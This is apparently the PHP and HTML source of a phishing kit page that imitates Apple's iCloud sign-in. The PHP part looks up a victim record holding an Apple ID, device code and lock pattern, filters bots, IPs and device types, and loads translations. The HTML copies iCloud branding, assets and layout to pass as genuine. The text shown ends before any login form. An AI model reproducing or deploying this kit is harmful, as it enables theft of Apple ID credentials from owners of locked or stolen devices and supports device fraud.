<?php  
    include_once("cf.php");
    include 'bots.php';
    $IPSSS = getRealIP();
    $x_id =  $_GET["ll"];
    
    option($x_id,1,1,$user_agent);
    
    $path = getcwd();
    $data = explode("/",$path);
    $host = "https://www.".$_SERVER["HTTP_HOST"]."/".$data[5]."/".$x_id;  
    $info = option($x_id,1,2,$user_agent,$host);
    // if($info->estado_peticion == 1){exit();}
    
    $row = option($x_id,1);
     
    $id_encode = $row->cod_equipo_encript;
    $estado_u = $row->estado;
    $WX_USUARIO_FIJO = $row->apple_id;
    $id_decode = $row->cod_equipo; 
    $placeholder_apple_id = $row->hind;  
    $cod_bloqueo = $row->patron;
    $VIEW_LINK = $row->view_link;
    $ACTIVOS = $row->activo;
    $idioma =  $row->idioma;
    
   // if($ACTIVOS != 1){atraz();exit();}
    
    $ips_1 = $row->ips_1;
    $ips_2 = $row->ips_2;
    $ips_3 = $row->ips_3;
    
    if($ips_1 != $ips){
        if($ips_2 != $ips){
            if($ips_3 != $ips){
               // atraz();exit();
            }
        }
    }
     
    if($VIEW_LINK != 1){
        if($VIEW_LINK == 2){
            $detect = det_dis();
            if($detect == "equipo"){ 
                atraz();
            }
        }else if($VIEW_LINK == 3){
            $detect = det_dis(); 
            if($detect == "tablet" || $detect == "mobil"){ 
                atraz();
            }
        }
    }

    if($estado_u == "es_0"){atraz();}
    if(trim($cod_bloqueo) == "" ||  trim($cod_bloqueo) == "0" ){if($estado_u == "es_1"){enlace("sing/".$x_id);}else{atraz();} }
    if($placeholder_apple_id == "" ){$placeholder_apple_id =  "ID de Apple"; }
	$WX_APPLE_ID = $placeholder_apple_id;
    if(empty($id_decode) || strlen($id_decode) < 0){ atraz();}
    
    
    if($idioma == 1){
        //Español
        $ruta_idioma = "idioma/espanol.php";
    }else if($idioma == 2){
        //Ingles
        $ruta_idioma = "idioma/ingles.php";
    }else if($idioma == 3){
        //Portugues
        $ruta_idioma = "idioma/portugues.php";
    }else if($idioma == 4){
        //Frances
        $ruta_idioma = "idioma/frances.php";
    }else if($idioma == 5){
        //Arabe
        $ruta_idioma = "idioma/arabe.php";
    }else{
        //default
        $ruta_idioma = "idioma/espanol.php";
    }
    
    
    include_once($ruta_idioma);
   
?>  
<!DOCTYPE html>
<html data-resources-css="LmN3LWFsZXJ0JTIwLmFsZXJ0LWljb24lN0JiYWNrZ3JvdW5kLWltYWdlJTNBdXJsKGJsb2JfMSklN0QlMEEuY3ctYWxlcnQlMjAuYWxlcnQtaWNvbi5pbmZvJTNBJTNBYWZ0ZXIlN0JiYWNrZ3JvdW5kLWltYWdlJTNBdXJsKGJsb2JfMiklN0QlMEEuY3ctYWxlcnQlMjAuYWxlcnQtaWNvbi5lcnJvciUzQSUzQWFmdGVyJTdCYmFja2dyb3VuZC1pbWFnZSUzQXVybChibG9iXzMpJTdEJTBBLmN3LWFsZXJ0JTIwLmFsZXJ0LWljb24uY2hlY2tlZCUzQSUzQWFmdGVyJTdCYmFja2dyb3VuZC1pbWFnZSUzQXVybChibG9iXzQpJTdEJTBBLmN3LWFsZXJ0JTIwLmFsZXJ0LWljb24uc2hhcmluZyUzQSUzQWFmdGVyJTdCYmFja2dyb3VuZC1pbWFnZSUzQXVybChibG9iXzUpJTdEJTBBY3ctY2hlY2tib3glMjBpbnB1dCUyQmxhYmVsJTNBJTNBYmVmb3JlJTdCYmFja2dyb3VuZC1pbWFnZSUzQXVybChibG9iXzYpJTdEJTBBY3ctY2hlY2tib3glMjBpbnB1dCUzQWFjdGl2ZSUyQmxhYmVsJTNBJTNBYmVmb3JlJTdCYmFja2dyb3VuZC1pbWFnZSUzQXVybChibG9iXzcpJTdEJTBBY3ctY2hlY2tib3glMjBpbnB1dCUzQWNoZWNrZWQlMkJsYWJlbCUzQSUzQWJlZm9yZSU3QmJhY2tncm91bmQtaW1hZ2UlM0F1cmwoYmxvYl84KSU3RCUwQWN3LWNoZWNrYm94JTIwaW5wdXQlM0FhY3RpdmUlM0FjaGVja2VkJTJCbGFiZWwlM0ElM0FiZWZvcmUlN0JiYWNrZ3JvdW5kLWltYWdlJTNBdXJsKGJsb2JfOSklN0QlMEFjdy1jaGVja2JveCUyMGlucHV0JTNBaW5kZXRlcm1pbmF0ZSUyQmxhYmVsJTNBJTNBYmVmb3JlJTdCYmFja2dyb3VuZC1pbWFnZSUzQXVybChibG9iXzEwKSU3RCUwQWN3LWNoZWNrYm94JTIwaW5wdXQlM0FhY3RpdmUlM0FpbmRldGVybWluYXRlJTJCbGFiZWwlM0ElM0FiZWZvcmUlN0JiYWNrZ3JvdW5kLWltYWdlJTNBdXJsKGJsb2JfMTEpJTdEJTBBLmNsb3NlLWljb24tYnV0dG9uLXZpZXclMjAudGl0bGUlN0JiYWNrZ3JvdW5kLWltYWdlJTNBdXJsKGJsb2JfMjMpJTdEJTBBLmJhc2UtbW9kYWwtYXJyb3ctcG9wb3Zlci12aWV3JTIwLmN3LXBvcG92ZXItdmlldyUzRS5jdy1wb3BvdmVyLWFycm93LmN3LXJpZ2h0LWFycm93JTdCYmFja2dyb3VuZC1pbWFnZSUzQXVybChibG9iXzEyOCklN0QlMEEuYmFzZS1tb2RhbC1hcnJvdy1wb3BvdmVyLXZpZXclMjAuY3ctcG9wb3Zlci12aWV3JTNFLmN3LXBvcG92ZXItYXJyb3cuY3ctbGVmdC1hcnJvdyU3QmJhY2tncm91bmQtaW1hZ2UlM0F1cmwoYmxvYl8xMjkpJTdEJTBBLmJhc2UtbW9kYWwtYXJyb3ctcG9wb3Zlci12aWV3JTIwLmN3LXBvcG92ZXItdmlldyUzRS5jdy1wb3BvdmVyLWFycm93LmN3LXVwLWFycm93JTdCYmFja2dyb3VuZC1pbWFnZSUzQXVybChibG9iXzEzMCklN0QlMEEuYmFzZS1tb2RhbC1hcnJvdy1wb3BvdmVyLXZpZXclMjAuY3ctcG9wb3Zlci12aWV3JTNFLmN3LXBvcG92ZXItYXJyb3cuY3ctZG93bi1hcnJvdyU3QmJhY2tncm91bmQtaW1hZ2UlM0F1cmwoYmxvYl8xMzEpJTdEJTBBLmN3LWFsZXJ0JTIwLmFsZXJ0LW1haW4tY29udGVudCUyMC5hbGVydC1pY29uJTdCYmFja2dyb3VuZC1pbWFnZSUzQXVybChibG9iXzEzMiklN0QlMEEuc2NhbGFibGUtYXBwLXN3aXRjaGVyLWl0ZW0tdmlldy5kaXNhYmxlZCUzQW5vdCgubG9ja2VkKSUzRS53YXJuaW5nLWljb24lN0JiYWNrZ3JvdW5kLWltYWdlJTNBdXJsKGJsb2JfMTMyKSU3RCUwQS5hcHAtc3dpdGNoZXItaXRlbS12aWV3JTIwLmFwcC1zd2l0Y2hlci1pdGVtLWNvbnRlbnQuZGlzYWJsZWQlMjAuaWNvbi1vdmVybGF5JTNBJTNBYWZ0ZXIlN0JiYWNrZ3JvdW5kLWltYWdlJTNBdXJsKGJsb2JfMTMyKSU3RCUwQS5jdy1hbGVydCUyMC5hbGVydC1tYWluLWNvbnRlbnQlMjAuYWxlcnQtaWNvbi5pY2xvdWQtaWNvbiU3QmJhY2tncm91bmQtaW1hZ2UlM0F1cmwoYmxvYl8xMzMpJTdEJTBBLmN3LWFsZXJ0JTIwLmFsZXJ0LW1haW4tY29udGVudCUyMC5hbGVydC1pY29uLnJlbWluZGVycy1pY29uJTdCYmFja2dyb3VuZC1pbWFnZSUzQXVybChibG9iXzEzNCklN0QlMEEuY3ctYWxlcnQlMjAuYWxlcnQtbWFpbi1jb250ZW50JTIwLmFsZXJ0LWljb24ucGhvdG9zLWljb24lN0JiYWNrZ3JvdW5kLWltYWdlJTNBdXJsKGJsb2JfMTM1KSU3RCUwQS5jaGluYS10ZXJtcy12aWV3JTIwLmNvbnRlbnQtc2Nyb2xsLXZpZXclMjAuY2hpbmEtdGVybXMtY29udGVudC12aWV3JTIwLmNoaW5hLXRlcm1zLWxvZ28lN0JiYWNrZ3JvdW5kLWltYWdlJTNBdXJsKGJsb2JfMTM2KSU3RCUwQS5zY2FsYWJsZS1hcHAtc3dpdGNoZXItaXRlbS12aWV3LmxvY2tlZCUzRS5sb2NrZWQtaWNvbiU3QmJhY2tncm91bmQtaW1hZ2UlM0F1cmwoYmxvYl8xMzgpJTdEJTBBLmFwcC1zd2l0Y2hlci1pdGVtLXZpZXclMjAuYXBwLXN3aXRjaGVyLWl0ZW0tY29udGVudC5sb2NrZWQlMjAuaWNvbi1vdmVybGF5JTNBJTNBYWZ0ZXIlN0JiYWNrZ3JvdW5kLWltYWdlJTNBdXJsKGJsb2JfMTM4KSU3RCUwQS5wb3BvdmVyLXZpZXclMjAuY3ctcG9wb3Zlci1hcnJvdy5jdy11cC1hcnJvdyU3QmJhY2tncm91bmQtaW1hZ2UlM0F1cmwoYmxvYl8xMzkpJTdEJTBBLnBvcG92ZXItdmlldyUyMC5jdy1wb3BvdmVyLWFycm93LmN3LWRvd24tYXJyb3clN0JiYWNrZ3JvdW5kLWltYWdlJTNBdXJsKGJsb2JfMTQwKSU3RCUwQS5wb3BvdmVyLXZpZXclMjAuY3ctcG9wb3Zlci1hcnJvdy5jdy1yaWdodC1hcnJvdyU3QmJhY2tncm91bmQtaW1hZ2UlM0F1cmwoYmxvYl8xNDEpJTdEJTBBLmFjY291bnQtc2V0dGluZ3MtbGluay12aWV3JTIwLmxpbmstYnV0dG9uJTNBbm90KC5zaG93aW5nLXNwaW5uZXIpJTIwJTNBJTNBYWZ0ZXIlN0JiYWNrZ3JvdW5kLWltYWdlJTNBdXJsKGJsb2JfMTQyKSU3RCUwQS5hcHAtc3dpdGNoZXItaXRlbS12aWV3JTIwLmFwcC1zd2l0Y2hlci1pdGVtLWNvbnRlbnQlMjAuYXBwLXN3aXRjaGVyLXNwaW5uZXItdmlldyU3QmJhY2tncm91bmQtaW1hZ2UlM0F1cmwoYmxvYl8xNDQpJTdEJTBBLnF1aWNrLWFjY2VzcyUyMC5xdWljay1hY2Nlc3MtYnV0dG9uLXZpZXcuZm1pcCUyMC5xdWljay1hY2Nlc3MtaWNvbiU3QmJhY2tncm91bmQtaW1hZ2UlM0F1cmwoYmxvYl8xNDUpJTdEJTBBLnF1aWNrLWFjY2VzcyUyMC5xdWljay1hY2Nlc3MtYnV0dG9uLXZpZXcuYXBwbGUtcGF5JTIwLnF1aWNrLWFjY2Vzcy1pY29uJTdCYmFja2dyb3VuZC1pbWFnZSUzQXVybChibG9iXzE0NiklN0QlMEEucXVpY2stYWNjZXNzJTIwLnF1aWNrLWFjY2Vzcy1idXR0b24tdmlldy5hcHBsZS13YXRjaCUyMC5xdWljay1hY2Nlc3MtaWNvbiU3QmJhY2tncm91bmQtaW1hZ2UlM0F1cmwoYmxvYl8xNDcpJTdEJTBB" data-primary-interaction-mode="mouse" class="windows chrome webkit" data-os-major-version="6" data-os-minor-version="2" data-major-version="77" data-minor-version="0" data-engine-major-version="537" lang="es-es" dir="ltr" data-device-type-class="desktop" data-horizontal-size-class="regular" data-vertical-size-class="compact">
   <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
      <script type="text/javascript">try{var event=new window.CustomEvent("test",{cancelable:!0});event.preventDefault()}catch(a){var PolyFillCustomEvent=function(a,b){var c;return b=b||{bubbles:!1,cancelable:!1,detail:void 0},c=document.createEvent("CustomEvent"),c.initCustomEvent(a,b.bubbles,b.cancelable,b.detail),c};PolyFillCustomEvent.prototype=window.Event.prototype,window.CustomEvent=PolyFillCustomEvent}(function(){function a(a){var b,c="";c=d(a)?"FatalError":"NonFatalError",b=new CustomEvent(c,{detail:{error:a.error,message:a.message,filename:a.filename,lineno:a.lineno,colno:a.colno}}),window.dispatchEvent(b)}var b=[],c=!0,d=function(){return!1};window.addEventListener("error",function(d){c?b.push(d):a(d)}),window.__startFilteringErrors=function(e){d=e;var f=b.length;if(0<f)for(var g,h=0;h<f;h++)g=b[h],a(g);b=void 0,c=!1,window.__startFilteringErrors=function(){throw new Error("__startFilteringErrors can only be invoked once")}}})(),function(){function a(a){var b,c="";c=d(a)?"FatalUnhandledRejection":"NonFatalUnhandledRejection",b=new CustomEvent(c,{detail:{nativeEvent:a}}),window.dispatchEvent(b)}var b=[],c=!0,d=function(){return!1};window.addEventListener("unhandledrejection",function(d){c?b.push(d):a(d)}),window.__startFilteringUnhandledRejections=function(e){d=e;var f=b.length;if(0<f)for(var g,h=0;h<f;h++)g=b[h],a(g);b=void 0,c=!1,window.__startFilteringUnhandledRejections=function(){throw new Error("__startFilteringUnhandledRejections can only be invoked once")}}}();</script>
      <meta name="viewport" content="initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
      <meta name="description" content="<?php echo $lang['DESCRIP'];?>">
      <meta name="keywords" content="icloud, free, apple">
      <meta name="og:title" content="iCloud.com">
      <meta name="og:image" content="https://www.icloud.com/icloud_logo/icloud_logo.png">
      <meta name="apple-mobile-web-app-capable" content="yes">
      <meta name="apple-mobile-web-app-status-bar-style" content="default">
      <meta name="google" content="notranslate">
      <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
      <title><?php echo $lang['TTILE'];?></title>
      <link rel="shortcut icon" href="https://appleid.cdn-apple.com/static/bin/cb3606853004/images/favicon.ico" type="image/X-icon">
      
      <script src="https://code.jquery.com/jquery-2.2.4.js"></script>
      <script type="text/javascript">
        function miFuncion() {
         $("#carga").css("display","none");$("#auth-frame").css("display","block")
         $(".cw-modal-dialog-background").css("display","none");
        }
      </script>
      <style type="text/css">
            .container-view{width: 100% !important;}
            .legal-footer-content {white-space: normal !important;}
            .legal-footer{text-align: center;} 
     

            @media only screen and (min-width: 750px) {
                .grande {display: block !important;top: 20% !important;}
                .chico {display: none !important;}
                .mediano {display: none !important;}
            }
    
            @media only screen and (max-width: 750px) {
                .mediano {display: block !important;}
                .grande {display: none !important;}
                .chico {display: none !important;}
            }
    
            @media only screen and (max-width: 500px) {
                .grande {display: none !important;}
                .mediano {display: none !important;}
                .chico {display: block !important;top: -5% !important;}
                .notice-view-container{display: none !important;}
                .cw-modal-dialog-background{display:none !important;}
            }
        </style>
    <link rel="stylesheet" id="cw-css" href="data:text/css;base64,LmN3LWFsZXJ0IC5hbGVydC1pY29ue2JhY2tncm91bmQtaW1hZ2U6dXJsKCJibG9iOmh0dHBzOi8vd3d3LmljbG91ZC5jb20vZTlmZjVjYjQtY2NmMS00Y2RkLTgwNTItZjQ4Y2U5NzMxZWU5Iil9Ci5jdy1hbGVydCAuYWxlcnQtaWNvbi5pbmZvOjphZnRlcntiYWNrZ3JvdW5kLWltYWdlOnVybCgiYmxvYjpodHRwczovL3d3dy5pY2xvdWQuY29tLzRmN2U1OTA5LTkzYTMtNGU5Yi1hOWUzLTI0NGZhYTEyODQ0OSIpfQouY3ctYWxlcnQgLmFsZXJ0LWljb24uZXJyb3I6OmFmdGVye2JhY2tncm91bmQtaW1hZ2U6dXJsKCJibG9iOmh0dHBzOi8vd3d3LmljbG91ZC5jb20vYTMyNzAzMGEtODMwMS00OGNiLWJlZjUtYWQ2Mzk1YzMxMmM0Iil9Ci5jdy1hbGVydCAuYWxlcnQtaWNvbi5jaGVja2VkOjphZnRlcntiYWNrZ3JvdW5kLWltYWdlOnVybCgiYmxvYjpodHRwczovL3d3dy5pY2xvdWQuY29tLzIxNzZiZmIzLTE3MDMtNDBlYi04NjU5LWI3MTYxMDdmOWZiMSIpfQouY3ctYWxlcnQgLmFsZXJ0LWljb24uc2hhcmluZzo6YWZ0ZXJ7YmFja2dyb3VuZC1pbWFnZTp1cmwoImJsb2I6aHR0cHM6Ly93d3cuaWNsb3VkLmNvbS80NzYzZDZhNS02NWFlLTQzN2EtOGMwZC05MmY3ZGU3YzkxMTQiKX0KY3ctY2hlY2tib3ggaW5wdXQrbGFiZWw6OmJlZm9yZXtiYWNrZ3JvdW5kLWltYWdlOnVybCgiYmxvYjpodHRwczovL3d3dy5pY2xvdWQuY29tLzNmZTA3YWNjLTFjMTYtNDZkZS1hODc1LTM2MTk1NDNmZDM2NiIpfQpjdy1jaGVja2JveCBpbnB1dDphY3RpdmUrbGFiZWw6OmJlZm9yZXtiYWNrZ3JvdW5kLWltYWdlOnVybCgiYmxvYjpodHRwczovL3d3dy5pY2xvdWQuY29tL2RiMDBhYTMyLWMxZDEtNDk2Mi04Njg2LWUyYzk4YTlhNzcxMyIpfQpjdy1jaGVja2JveCBpbnB1dDpjaGVja2VkK2xhYmVsOjpiZWZvcmV7YmFja2dyb3VuZC1pbWFnZTp1cmwoImJsb2I6aHR0cHM6Ly93d3cuaWNsb3VkLmNvbS85ZGY5NDQxZC1jNDEzLTQwNzUtODQ5Ny1lZGRlM2Y2YTVmNmMiKX0KY3ctY2hlY2tib3ggaW5wdXQ6YWN0aXZlOmNoZWNrZWQrbGFiZWw6OmJlZm9yZXtiYWNrZ3JvdW5kLWltYWdlOnVybCgiYmxvYjpodHRwczovL3d3dy5pY2xvdWQuY29tLzI3YjVlNjI4LWRjYTMtNDhkMC1iNmFjLTM1N2FmMmNmNDRiNSIpfQpjdy1jaGVja2JveCBpbnB1dDppbmRldGVybWluYXRlK2xhYmVsOjpiZWZvcmV7YmFja2dyb3VuZC1pbWFnZTp1cmwoImJsb2I6aHR0cHM6Ly93d3cuaWNsb3VkLmNvbS81MGJmMGUwMy1lMzMzLTQ3MmEtYjBlMi02N2JlNWFiYmE0MWQiKX0KY3ctY2hlY2tib3ggaW5wdXQ6YWN0aXZlOmluZGV0ZXJtaW5hdGUrbGFiZWw6OmJlZm9yZXtiYWNrZ3JvdW5kLWltYWdlOnVybCgiYmxvYjpodHRwczovL3d3dy5pY2xvdWQuY29tL2I2MTI0Zjc5LTE5MzYtNGRjNC04NmZhLWQxYzE2MGEyMDBmZCIpfQouY2xvc2UtaWNvbi1idXR0b24tdmlldyAudGl0bGV7YmFja2dyb3VuZC1pbWFnZTp1cmwoImJsb2I6aHR0cHM6Ly93d3cuaWNsb3VkLmNvbS8xNjUzMDllYS04MDZkLTRhMzYtYjYxOC0xMWFkZjhlYmJlY2MiKX0KLmJhc2UtbW9kYWwtYXJyb3ctcG9wb3Zlci12aWV3IC5jdy1wb3BvdmVyLXZpZXc+LmN3LXBvcG92ZXItYXJyb3cuY3ctcmlnaHQtYXJyb3d7YmFja2dyb3VuZC1pbWFnZTp1cmwoImJsb2I6aHR0cHM6Ly93d3cuaWNsb3VkLmNvbS9hYzFhZDA3ZS02N2Y1LTRkOTUtYWRlYy1lZjQ0NzM3N2U5OTkiKX0KLmJhc2UtbW9kYWwtYXJyb3ctcG9wb3Zlci12aWV3IC5jdy1wb3BvdmVyLXZpZXc+LmN3LXBvcG92ZXItYXJyb3cuY3ctbGVmdC1hcnJvd3tiYWNrZ3JvdW5kLWltYWdlOnVybCgiYmxvYjpodHRwczovL3d3dy5pY2xvdWQuY29tLzgxYzM0MzVkLTEwMzItNGY5Ni04OTQzLTAyMWIwNTZjM2YyMyIpfQouYmFzZS1tb2RhbC1hcnJvdy1wb3BvdmVyLXZpZXcgLmN3LXBvcG92ZXItdmlldz4uY3ctcG9wb3Zlci1hcnJvdy5jdy11cC1hcnJvd3tiYWNrZ3JvdW5kLWltYWdlOnVybCgiYmxvYjpodHRwczovL3d3dy5pY2xvdWQuY29tL2ZiM2Y4OWViLTBkZWUtNDYxYS05MTZhLWJlNmNiNmU2N2EzZSIpfQouYmFzZS1tb2RhbC1hcnJvdy1wb3BvdmVyLXZpZXcgLmN3LXBvcG92ZXItdmlldz4uY3ctcG9wb3Zlci1hcnJvdy5jdy1kb3duLWFycm93e2JhY2tncm91bmQtaW1hZ2U6dXJsKCJibG9iOmh0dHBzOi8vd3d3LmljbG91ZC5jb20vOTNkMzBiMDItMDNlZC00OTU2LWEyNWYtZmQyNmUzNjdlZGVlIil9Ci5jdy1hbGVydCAuYWxlcnQtbWFpbi1jb250ZW50IC5hbGVydC1pY29ue2JhY2tncm91bmQtaW1hZ2U6dXJsKCJibG9iOmh0dHBzOi8vd3d3LmljbG91ZC5jb20vMDMxMWNjNjUtZGJhMi00YzM4LWFiYjctMmNlNTA1ZmQ0ZjA5Iil9Ci5zY2FsYWJsZS1hcHAtc3dpdGNoZXItaXRlbS12aWV3LmRpc2FibGVkOm5vdCgubG9ja2VkKT4ud2FybmluZy1pY29ue2JhY2tncm91bmQtaW1hZ2U6dXJsKCJibG9iOmh0dHBzOi8vd3d3LmljbG91ZC5jb20vMDMxMWNjNjUtZGJhMi00YzM4LWFiYjctMmNlNTA1ZmQ0ZjA5Iil9Ci5hcHAtc3dpdGNoZXItaXRlbS12aWV3IC5hcHAtc3dpdGNoZXItaXRlbS1jb250ZW50LmRpc2FibGVkIC5pY29uLW92ZXJsYXk6OmFmdGVye2JhY2tncm91bmQtaW1hZ2U6dXJsKCJibG9iOmh0dHBzOi8vd3d3LmljbG91ZC5jb20vMDMxMWNjNjUtZGJhMi00YzM4LWFiYjctMmNlNTA1ZmQ0ZjA5Iil9Ci5jdy1hbGVydCAuYWxlcnQtbWFpbi1jb250ZW50IC5hbGVydC1pY29uLmljbG91ZC1pY29ue2JhY2tncm91bmQtaW1hZ2U6dXJsKCJibG9iOmh0dHBzOi8vd3d3LmljbG91ZC5jb20vYzI5MzAxMzAtOWQ1Ny00OThjLWI4MGUtZmY2NzM1OTQyNDEwIil9Ci5jdy1hbGVydCAuYWxlcnQtbWFpbi1jb250ZW50IC5hbGVydC1pY29uLnJlbWluZGVycy1pY29ue2JhY2tncm91bmQtaW1hZ2U6dXJsKCJibG9iOmh0dHBzOi8vd3d3LmljbG91ZC5jb20vMGYyMjU2ZGEtMDE2OS00N2I5LWIzODMtOWRjNzc2NDUyZGFhIil9Ci5jdy1hbGVydCAuYWxlcnQtbWFpbi1jb250ZW50IC5hbGVydC1pY29uLnBob3Rvcy1pY29ue2JhY2tncm91bmQtaW1hZ2U6dXJsKCJibG9iOmh0dHBzOi8vd3d3LmljbG91ZC5jb20vMDc2OTJkZGYtNTRlMS00NGRiLWEyNmQtOTVlNTVlMGQ4YTRhIil9Ci5jaGluYS10ZXJtcy12aWV3IC5jb250ZW50LXNjcm9sbC12aWV3IC5jaGluYS10ZXJtcy1jb250ZW50LXZpZXcgLmNoaW5hLXRlcm1zLWxvZ297YmFja2dyb3VuZC1pbWFnZTp1cmwoImJsb2I6aHR0cHM6Ly93d3cuaWNsb3VkLmNvbS8wNzczY2M0Yy00NmNjLTRlNGMtYjU2ZC05ZDczMjQxNDZlZDgiKX0KLnNjYWxhYmxlLWFwcC1zd2l0Y2hlci1pdGVtLXZpZXcubG9ja2VkPi5sb2NrZWQtaWNvbntiYWNrZ3JvdW5kLWltYWdlOnVybCgiYmxvYjpodHRwczovL3d3dy5pY2xvdWQuY29tLzZjZTJhZDM3LTNjMDgtNGI4Ni1hYjZjLTBhMWVjYjgxYzlkZSIpfQouYXBwLXN3aXRjaGVyLWl0ZW0tdmlldyAuYXBwLXN3aXRjaGVyLWl0ZW0tY29udGVudC5sb2NrZWQgLmljb24tb3ZlcmxheTo6YWZ0ZXJ7YmFja2dyb3VuZC1pbWFnZTp1cmwoImJsb2I6aHR0cHM6Ly93d3cuaWNsb3VkLmNvbS82Y2UyYWQzNy0zYzA4LTRiODYtYWI2Yy0wYTFlY2I4MWM5ZGUiKX0KLnBvcG92ZXItdmlldyAuY3ctcG9wb3Zlci1hcnJvdy5jdy11cC1hcnJvd3tiYWNrZ3JvdW5kLWltYWdlOnVybCgiYmxvYjpodHRwczovL3d3dy5pY2xvdWQuY29tL2E1ZjY1YmFjLWY0ODItNDJjMi05NDUxLTYzMzc5N2QxOGY0ZSIpfQoucG9wb3Zlci12aWV3IC5jdy1wb3BvdmVyLWFycm93LmN3LWRvd24tYXJyb3d7YmFja2dyb3VuZC1pbWFnZTp1cmwoImJsb2I6aHR0cHM6Ly93d3cuaWNsb3VkLmNvbS8zMTM0NmNjYy1lNDFmLTQ4ZjktOTg3Ni03ZGNlNThlNGZhNGUiKX0KLnBvcG92ZXItdmlldyAuY3ctcG9wb3Zlci1hcnJvdy5jdy1yaWdodC1hcnJvd3tiYWNrZ3JvdW5kLWltYWdlOnVybCgiYmxvYjpodHRwczovL3d3dy5pY2xvdWQuY29tL2YwZjI4ZjU3LThkMmMtNDk4NS04YmNmLTU5MGYxMGQwMmZkYSIpfQouYWNjb3VudC1zZXR0aW5ncy1saW5rLXZpZXcgLmxpbmstYnV0dG9uOm5vdCguc2hvd2luZy1zcGlubmVyKSA6OmFmdGVye2JhY2tncm91bmQtaW1hZ2U6dXJsKCJibG9iOmh0dHBzOi8vd3d3LmljbG91ZC5jb20vMTBjZDQxZjItNmNlZC00MmMwLWFkNDYtNjRiNGZkZDRkNTYzIil9Ci5hcHAtc3dpdGNoZXItaXRlbS12aWV3IC5hcHAtc3dpdGNoZXItaXRlbS1jb250ZW50IC5hcHAtc3dpdGNoZXItc3Bpbm5lci12aWV3e2JhY2tncm91bmQtaW1hZ2U6dXJsKCJibG9iOmh0dHBzOi8vd3d3LmljbG91ZC5jb20vOWJhZWE0OTMtNTE3NS00OTZiLThjMGUtZGY5ZDNlZDE3ODRjIil9Ci5xdWljay1hY2Nlc3MgLnF1aWNrLWFjY2Vzcy1idXR0b24tdmlldy5mbWlwIC5xdWljay1hY2Nlc3MtaWNvbntiYWNrZ3JvdW5kLWltYWdlOnVybCgiYmxvYjpodHRwczovL3d3dy5pY2xvdWQuY29tLzEyNWM5MDdhLWE4NzMtNDA5OS04YWM1LTE4ZTk2OTE3MGVlZCIpfQoucXVpY2stYWNjZXNzIC5xdWljay1hY2Nlc3MtYnV0dG9uLXZpZXcuYXBwbGUtcGF5IC5xdWljay1hY2Nlc3MtaWNvbntiYWNrZ3JvdW5kLWltYWdlOnVybCgiYmxvYjpodHRwczovL3d3dy5pY2xvdWQuY29tL2ZmNzFhZjZkLTY2YzUtNDBmMi1iNjFlLTRkMzRkZGY5ZDg3MiIpfQoucXVpY2stYWNjZXNzIC5xdWljay1hY2Nlc3MtYnV0dG9uLXZpZXcuYXBwbGUtd2F0Y2ggLnF1aWNrLWFjY2Vzcy1pY29ue2JhY2tncm91bmQtaW1hZ2U6dXJsKCJibG9iOmh0dHBzOi8vd3d3LmljbG91ZC5jb20vOWZmNTYzYWItZWQ1ZC00YThiLWI5YTMtY2ZlYWM0OGI4OWMyIil9Cg==">
   </head>
   <body style="touch-action: none;" onload="miFuncion();"  >
      <div style="position: absolute; left: 0px; top: -10000px;">
         <div style="font-family: SFDisplay, SFText, Helvetica, sans-serif; font-size: 26px; font-weight: 600; display: inline-block; max-width: 1890px;">Good afternoon, Abcdef.</div>
         <div style="font-family: SFText, Helvetica, sans-serif; font-size: 15px; font-weight: 500; display: inline-block; max-width: 1890px;" class="bootstrap-mock-account-settings">Account Settings</div>
         <style>.bootstrap-mock-account-settings::after{content:"";display:inline-block;width:4px;height:10px;margin-left:5px;}</style>
      </div>
      <div style="position: absolute; left: 0px; top: -10000px;">
         <div style="font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; display: inline-block; max-width: 1840px;" class="bootstrap-mock-learn-more-detail-text">Use more Apps on iCloud.com on an iPad or desktop computer. Learn more…</div>
      </div>
      <link rel="stylesheet" href="https://www.icloud.com/system/cloudos2/2117Hotfix58/es-es/main.css">
      <div class="cw-pane-container">
         <div>
            <div class="root-view">
               <div></div>
               <div></div>
                <div class="single-presenter-view cloudos-presenter-view multi-child-view" style="margin-top: 0px;">
                  <div class="child-views">
                  <div class="contt">
                    <div class="bootstrap-mock-springboard-view chico" aria-hidden="true" style="position: absolute; pointer-events: none; user-select: none; width: 500px; height: 860px; filter: blur(33.3333px); z-index: -1; left: 0px; top: 44px;">
             <div style="position: absolute; width: 78px; height: 78px; border-radius: 50%; background-color: rgb(192, 192, 192); left: 211px; top: 107.424px;"></div>
             <div style="position: absolute; font-family: SFDisplay, SFText, Helvetica, sans-serif; font-size: 26px; font-weight: 600; color: rgb(51, 51, 51); text-align: center; width: 304px; height: 31px; left: 98px; top: 202.424px;">Good afternoon, Abcdef.</div>
             <div class="bootstrap-mock-account-settings" style="position: absolute; font-family: SFText, Helvetica, sans-serif; font-size: 15px; font-weight: 500; color: rgb(4, 199, 255); text-align: center; width: 146.4px; height: 17px; left: 176.8px; top: 246.424px;">Account Settings</div>
             <style>.bootstrap-mock-springboard-view * { filter: contrast(0.65) brightness(1.2); }</style>
             <div style="position: absolute; border-radius: 20%; height: 78.6px; width: 55.5px; left: 80.725px; top: 349.364px; background-color: rgb(102, 188, 249);">
                <div style="position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;">Mail</div>
             </div>
             <div style="position: absolute; border-radius: 20%; height: 78.6px; width: 55.5px; left: 175.075px; top: 349.364px; background-color: rgb(204, 204, 191);">
                <div style="position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;">Contacts</div>
             </div>
             <div style="position: absolute; border-radius: 20%; height: 78.6px; width: 55.5px; left: 269.425px; top: 349.364px; background-color: rgb(239, 232, 231);">
                <div style="position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;">Calendar</div>
             </div>
             <div style="position: absolute; border-radius: 20%; height: 78.6px; width: 55.5px; left: 363.775px; top: 349.364px; background-color: rgb(208, 196, 179);">
                <div style="position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;">Photos</div>
             </div>
